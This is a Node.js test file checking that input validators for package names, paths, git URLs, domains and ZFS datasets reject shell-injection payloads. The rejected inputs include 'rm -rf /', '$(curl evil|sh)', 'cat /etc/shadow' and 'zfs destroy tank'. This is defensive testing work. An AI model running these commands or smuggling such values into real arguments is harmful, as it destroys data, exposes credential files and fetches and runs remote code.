// test/testStmValidators.js
//
// Coverage for the STM input validators in stmValidators.js — the defense that
// stops a malformed STM from becoming container RCE via the `sh -c` command
// builders in system-protocol-api.js.
//
// Run: node docker/test/testStmValidators.js

'use strict';

const path = require('path');
const { V, must, verifyCommit } = require(path.join(__dirname, '..', 'stmValidators'));

let pass = 0, fail = 0;
function ok(cond, label) {
    if (cond) { pass++; console.log(`  PASS ${label}`); }
    else      { fail++; console.log(`  FAIL ${label}`); }
}
// must() throws on reject, returns the value on accept.
function accepts(re, value) { try { must(value, re, 'x'); return true; } catch { return false; } }
function rejects(re, value) { return !accepts(re, value); }

console.log('── injection payloads must be REJECTED ──');
// Shell metacharacter / command-substitution / traversal payloads across every
// field that reaches a shell string or argv.
const attacks = [
    ['packageName', V.packageName, 'foo; rm -rf /'],
    ['packageName', V.packageName, '$(curl evil|sh)'],
    ['packageName', V.packageName, '`reboot`'],
    ['packageName', V.packageName, 'foo && wget x'],
    ['packageName', V.packageName, 'foo\nbar'],
    ['packageName', V.packageName, 'foo bar'],           // space
    ['packageName', V.packageName, '../../../etc/passwd'],
    ['version',     V.version,     '1.0 && wget x'],
    ['version',     V.version,     '1.0; id'],
    ['version',     V.version,     '$(id)'],
    ['absPath',     V.absPath,     '/app; cat /etc/shadow'],
    ['absPath',     V.absPath,     '/app/../../etc'],
    ['absPath',     V.absPath,     'relative/path'],     // not absolute
    ['absPath',     V.absPath,     '/app$(x)'],
    ['absPath',     V.absPath,     '/app`x`'],
    ['gitUrl',      V.gitUrl,      'https://x.com/r; rm -rf /'],
    ['gitUrl',      V.gitUrl,      'http://x.com/r'],     // non-https, non-ssh
    ['gitUrl',      V.gitUrl,      'file:///etc/passwd'],
    ['gitUrl',      V.gitUrl,      'https://x.com/$(id)'],
    ['domain',      V.domain,      'x.com; reboot'],
    ['domain',      V.domain,      'x.com && curl evil'],
    ['domain',      V.domain,      '$(hostname)'],
    ['ident',       V.ident,       'app; rm'],
    ['ident',       V.ident,       'app/../etc'],
    ['zfsDataset',  V.zfsDataset,  'safebox-pool/x; zfs destroy tank'],
    ['zfsDataset',  V.zfsDataset,  'tank/evil'],          // wrong pool
    ['zfsDataset',  V.zfsDataset,  'safebox-pool/../tank'],
    ['zfsSnapName', V.zfsSnapName, 'snap; rm'],
    ['zfsSnapName', V.zfsSnapName, '../escape'],
    ['commit',      V.commit,      'abc; rm'],
    ['commit',      V.commit,      'HEAD'],                // not hex
    ['integrity',   V.integrity,   'md5-xxxx'],            // wrong algo
];
for (const [label, re, val] of attacks) {
    ok(rejects(re, val), `reject ${label}: ${JSON.stringify(val)}`);
}

console.log('\n── non-string / edge inputs must be REJECTED ──');
ok(rejects(V.packageName, undefined),        'reject undefined');
ok(rejects(V.packageName, null),             'reject null');
ok(rejects(V.packageName, 12345),            'reject number');
ok(rejects(V.packageName, {}),               'reject object');
ok(rejects(V.packageName, []),               'reject array');
ok(rejects(V.packageName, ''),               'reject empty string');
ok(rejects(V.packageName, 'a'.repeat(215)),  'reject over-length package name');
ok(rejects(V.absPath, '/' + 'a'.repeat(255)),'reject over-length path');

console.log('\n── legitimate values must be ACCEPTED ──');
const legit = [
    ['packageName', V.packageName, '@scope/name'],
    ['packageName', V.packageName, 'lodash'],
    ['packageName', V.packageName, 'vendor/package'],
    ['packageName', V.packageName, 'requests[security]'.replace('[','').replace(']','')], // pip extras stripped form
    ['version',     V.version,     '^1.2.3'],
    ['version',     V.version,     '~2.0.0'],
    ['version',     V.version,     '1.0.0-beta.1'],
    ['version',     V.version,     '>=3.0'],
    ['absPath',     V.absPath,     '/app'],
    ['absPath',     V.absPath,     '/var/www/html'],
    ['absPath',     V.absPath,     '/srv/tenants/alice/node'],
    ['gitUrl',      V.gitUrl,      'https://github.com/Qbix/Platform.git'],
    ['gitUrl',      V.gitUrl,      'git@github.com:Qbix/Platform.git'],
    ['domain',      V.domain,      'app.example.com'],
    ['domain',      V.domain,      'safebots.ai'],
    ['domain',      V.domain,      'a.b.c.d.example.co'],
    ['ident',       V.ident,       'tenant_alice'],
    ['ident',       V.ident,       'my-app.v2'],
    ['zfsDataset',  V.zfsDataset,  'safebox-pool/mariadb'],
    ['zfsDataset',  V.zfsDataset,  'safebox-pool/tenants/acme'],
    ['zfsSnapName', V.zfsSnapName, 'pre-migration-20260709'],
    ['zfsSnapName', V.zfsSnapName, 'baseline'],
    ['commit',      V.commit,      'a'.repeat(40)],
    ['commit',      V.commit,      'b'.repeat(64)],
    ['integrity',   V.integrity,   'sha512-' + 'A'.repeat(40)],
];
for (const [label, re, val] of legit) {
    ok(accepts(re, val), `accept ${label}: ${JSON.stringify(val)}`);
}

console.log('\n── verifyCommit: pinned-commit hard-fail ──');
{
    const pinned = 'a'.repeat(40);
    // exact match on the last line of `git rev-parse HEAD` output
    ok(verifyCommit(pinned, pinned, 'git-clone').ok === true, 'exact match returns ok');
    // real-world output: clone chatter then the HEAD sha on the last line
    ok(verifyCommit(`Cloning...\nchecking out\n${pinned}\n`, pinned, 'git-clone').head === pinned,
       'HEAD taken from last non-empty line of noisy output');
    // MISMATCH must THROW, not return a soft flag — this is the whole fix
    let threw = false;
    try { verifyCommit('b'.repeat(40), pinned, 'git-clone'); } catch { threw = true; }
    ok(threw, 'commit mismatch THROWS (not verified:false-as-success)');
    // a moved ref that lands on a different sha
    let threw2 = false;
    try { verifyCommit(`stuff\n${'c'.repeat(40)}\n`, pinned, 'git-pull'); } catch { threw2 = true; }
    ok(threw2, 'different HEAD on last line throws');
    // empty / missing output must not silently pass
    let threw3 = false;
    try { verifyCommit('', pinned, 'git-checkout'); } catch { threw3 = true; }
    ok(threw3, 'empty output throws (no HEAD to verify)');
}

console.log(`\n${pass}/${pass + fail} passed`);
process.exit(fail === 0 ? 0 : 1);